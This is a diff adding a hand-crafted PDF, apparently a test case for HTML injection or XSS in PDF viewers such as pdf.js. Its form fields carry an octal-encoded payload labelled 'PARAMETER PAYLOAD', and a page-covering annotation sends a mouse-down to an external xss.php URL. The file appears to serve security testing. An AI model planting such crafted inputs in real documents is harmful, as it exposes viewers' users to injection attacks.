@@ -1,0 +1,92 @@
+%PDF-1.1
+1 0 obj
+<<
+%    /Type /Catalog
+    /Pages 2 0 R
+    /AcroForm 22 0 R
+>>
+endobj
+
+22 0 obj
+<<
+    /Fields [23 0 R]
+>>
+
+23 0 obj
+<<
+    /DA (/Helv 12 Tf 0 g)
+    /F 4
+    /FT /Tx
+    /Rect [ 9.526760 680.078003 297.527008 702.078003 ]
+    /Subtype /Widget
+    /Type /Annot
+    % PARAMETER NAME
+    /T (\150\145\154\154\157\74\151\76\150\164\164\160\163\72\57\57\143\165\162\145\65\63\56\144\145\12\146\146\12\12\12\12\12\12\146\146\146\146\146)
+    % PARAMETER PAYLOAD
+    /V (\150\145\154\154\157\74\151\76\150\164\164\160\163\72\57\57\143\165\162\145\65\63\56\144\145\12\146\146\12\12\12\12\12\12\146\146\146\146\146)
+    /P 3 0 R
+>>
+endobj
+
+124 0 obj
+<< 
+/F 4 
+/FT /Tx 
+/Rect [ 0 0 1024 1024 ] 
+/Subtype /Widget /T (\150\145\154\154\157\74\151\76\150\164\164\160\163\72\57\57\143\165\162\145\65\63\56\144\145\12\146\146\12\12\12\12\12\12\146\146\146\146\146) /Type /Annot /AA 
+    << 
+    /D << 
+        /Type /Action /S /URI 
+    /URI (https://terjanq.me/xss.php)
+    >> 
+    >> 
+>>
+endobj
+
+
+2 0 obj
+<<
+    /Type /Pages
+    /Count 1
+    /Kids [ 3 0 R ]
+>>
+endobj
+
+3 0 obj
+<<
+    /Type /Page
+    /Contents 4 0 R
+    /Annots [124 0 R]
+    /Parent 2 0 R
+    /Resources <<
+        /Font <<
+            /F1 <<
+                /Type /Font
+                /Subtype /Type1
+                /BaseFont /Arial
+            >>
+        >>
+    >>
+>>
+endobj
+
+4 0 obj
+<<
+>>
+stream
+BT
+/F1 100
+Tf 1 1 1 1 1 0
+Tr(Hello World!)Tj
+ET
+endstream
+endobj
+
+
+trailer
+<<
+    /Root 1 0 R
+>>
+%%EOF
+% a naive PDF (for pdf.js) with more elements than usually required
+% Ange Albertini, BSD licence 2012
